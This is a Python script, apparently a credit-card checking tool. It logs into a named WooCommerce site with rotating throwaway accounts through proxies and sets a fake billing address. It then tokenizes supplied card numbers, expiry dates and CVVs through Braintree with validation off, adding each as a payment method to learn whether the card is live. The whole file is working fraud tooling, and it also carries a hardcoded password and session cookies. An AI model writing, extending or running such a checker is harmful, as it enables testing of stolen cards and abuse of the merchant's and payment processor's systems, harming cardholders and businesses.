import requests
import base64, uuid, re
from bs4 import BeautifulSoup
from proxy import proxies
import secrets,json
def getstr(s, start, end):
    try:
        return s.split(start)[1].split(end)[0]
    except:
        return ''
    
current_index = 0
def login_user():
    global current_index
    users = ['ayangay', 'ayangay2', 'ayangay3', 'ayangay4', 'ayangay5',
             'ayangay6', 'ayangay7', 'ayangay8', 'ayangay9', 'ayangay10',
             'ayangay11', 'ayangay12', 'ayangay13', 'ayangay14', 'ayangay15',
             'ayangay16', 'ayangay17', 'ayangay18', 'ayangay19', 'ayangay20']
    
    username = users[current_index]
    
    current_index = (current_index + 1) % len(users)
    
    return username
async def B3_Auth3(cc,mm,yy,cvv):
    login = login_user()
    se = requests.session()
    se.proxies = proxies()
    corr_id = secrets.token_hex(16)
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    try:
        response = se.get('https://disciplinedfinancialmanagement.com/login/', headers=headers)
    except requests.exceptions.ProxyError:
        return 'Proxy Error'
    except requests.exceptions.ConnectionError:
        return 'Connection Error'
    except:
        return 'Error in 1st Request'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'uncode_privacy[consent_types]=%5B%5D; aiovg_rand_seed=968089489; wordpress_test_cookie=WP%20Cookie%20check; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F',
        'origin': 'https://disciplinedfinancialmanagement.com',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/login/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    data = {
        'log': login,
        'pwd': 'Ayanpro@087',
        'submit': '',
        'redirect_to': 'https://disciplinedfinancialmanagement.com/wp-admin/',
        'testcookie': '1',
    }

    response = se.post('https://disciplinedfinancialmanagement.com/login/', headers=headers, data=data)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/login/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    response = se.get('https://disciplinedfinancialmanagement.com/myaccount', headers=headers)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': 'uncode_privacy[consent_types]=%5B%5D; aiovg_rand_seed=968089489; wordpress_test_cookie=WP%20Cookie%20check; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36; wordpress_logged_in_6b955d6741219a026f9334193744bea4=ayangay%7C1738437822%7CavPvD1FNQfGkjK9qsoIv5wLC8iGZIQkFTCJ2S2adx5g%7Cc5d37627d7c965d2618973ed83de4f530feadbc6b9f57361f7418dab1a8d0672; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Fmyaccount',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/myaccount',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    response = se.get('https://disciplinedfinancialmanagement.com/my-account/edit-address/', headers=headers)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': 'uncode_privacy[consent_types]=%5B%5D; aiovg_rand_seed=968089489; wordpress_test_cookie=WP%20Cookie%20check; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36; wordpress_logged_in_6b955d6741219a026f9334193744bea4=ayangay%7C1738437822%7CavPvD1FNQfGkjK9qsoIv5wLC8iGZIQkFTCJ2S2adx5g%7Cc5d37627d7c965d2618973ed83de4f530feadbc6b9f57361f7418dab1a8d0672; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Fmy-account%2Fedit-address%2F',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/my-account/edit-address/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    try:
        response = se.get(
            'https://disciplinedfinancialmanagement.com/my-account/edit-address/billing/',
            headers=headers,
        )
        edit_nonce = getstr(response.text, 'woocommerce-edit-address-nonce" value="', '"')
    except:
        return 'Error in 2nd Request'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'uncode_privacy[consent_types]=%5B%5D; aiovg_rand_seed=968089489; wordpress_test_cookie=WP%20Cookie%20check; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36; wordpress_logged_in_6b955d6741219a026f9334193744bea4=ayangay%7C1738437822%7CavPvD1FNQfGkjK9qsoIv5wLC8iGZIQkFTCJ2S2adx5g%7Cc5d37627d7c965d2618973ed83de4f530feadbc6b9f57361f7418dab1a8d0672; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
        'origin': 'https://disciplinedfinancialmanagement.com',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/my-account/edit-address/billing/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    data = {
        'billing_first_name': 'Albedo',
        'billing_last_name': 'Jones',
        'billing_company': '',
        'billing_country': 'US',
        'billing_address_1': 'New York',
        'billing_address_2': '',
        'billing_city': 'New York',
        'billing_state': 'NY',
        'billing_postcode': '10080',
        'billing_phone': '8747896748',
        'billing_email': 'lope.z.j.ul.ius.sss.s@googlemail.com',
        'save_address': 'Save address',
        'woocommerce-edit-address-nonce': edit_nonce,
        '_wp_http_referer': '/my-account/edit-address/billing/',
        'action': 'edit_address',
    }

    response = se.post(
        'https://disciplinedfinancialmanagement.com/my-account/edit-address/billing/',
        headers=headers,
        data=data,
    )
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        # 'cookie': 'uncode_privacy[consent_types]=%5B%5D; aiovg_rand_seed=968089489; wordpress_test_cookie=WP%20Cookie%20check; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36; wordpress_logged_in_6b955d6741219a026f9334193744bea4=ayangay%7C1738437822%7CavPvD1FNQfGkjK9qsoIv5wLC8iGZIQkFTCJ2S2adx5g%7Cc5d37627d7c965d2618973ed83de4f530feadbc6b9f57361f7418dab1a8d0672; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Fmy-account%2Fpayment-methods%2F',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/my-account/payment-methods/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }
    try:
        response = se.get(
            'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
            headers=headers,
        )
        add_payment = getstr(response.text, 'woocommerce-add-payment-method-nonce" value="', '"')
        client_nonce = getstr(response.text, '"client_token_nonce":"', '"').strip()
    except:
        return 'Error in 3rd Request'
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wordpress_sec_6b955d6741219a026f9334193744bea4=ayangay%7C1738437822%7CavPvD1FNQfGkjK9qsoIv5wLC8iGZIQkFTCJ2S2adx5g%7Cc708912e222c8ac5553ee5bdca0f1a65ac26469ce2de69140510b82018be4002; uncode_privacy[consent_types]=%5B%5D; aiovg_rand_seed=968089489; wordpress_test_cookie=WP%20Cookie%20check; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-30%2019%3A53%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Flogin%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Safari%2F537.36; wordpress_logged_in_6b955d6741219a026f9334193744bea4=ayangay%7C1738437822%7CavPvD1FNQfGkjK9qsoIv5wLC8iGZIQkFTCJ2S2adx5g%7Cc5d37627d7c965d2618973ed83de4f530feadbc6b9f57361f7418dab1a8d0672; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdisciplinedfinancialmanagement.com%2Fmy-account%2Fadd-payment-method%2F',
        'origin': 'https://disciplinedfinancialmanagement.com',
        'priority': 'u=1, i',
        'referer': 'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_nonce,
    }
    try:
        response = se.post(
            'https://disciplinedfinancialmanagement.com/wp-admin/admin-ajax.php',
            headers=headers,
            data=data,
        )
        client_token = response.json()['data']
        dec = base64.b64decode(client_token).decode('utf-8')
        at = getstr(dec, '"authorizationFingerprint":"', '"')
    except json.decoder.JSONDecodeError:
        return 'Json Decode Error'
    except:
        return 'Error in 4th Request'
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvv,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    try:
        response = se.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        
        token = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return 'Error in 5th Request'

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://disciplinedfinancialmanagement.com',
        'priority': 'u=0, i',
        'referer': 'https://disciplinedfinancialmanagement.com/my-account/add-payment-method/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': 'master-card',
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '{"correlation_id":"'+corr_id+'"}',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': add_payment,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1'
    }
    try:
        response = se.post('https://disciplinedfinancialmanagement.com/my-account/add-payment-method/', headers=headers,data=data)
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find('ul', class_='woocommerce-error-list woocommerce-error wc-notice')
        if error_message:
                error_text = error_message.get_text(strip=True)
                formatted_error = re.sub(r'Status code\s+', '', error_text)
                return formatted_error
        elif 'Nice! New payment method added' in response.text or 'Payment method successfully added.' in response.text:
            return "Nice! New payment method added"
        else:
            return "Error in Last Request"
    except:
        return 'Error in 6th Request'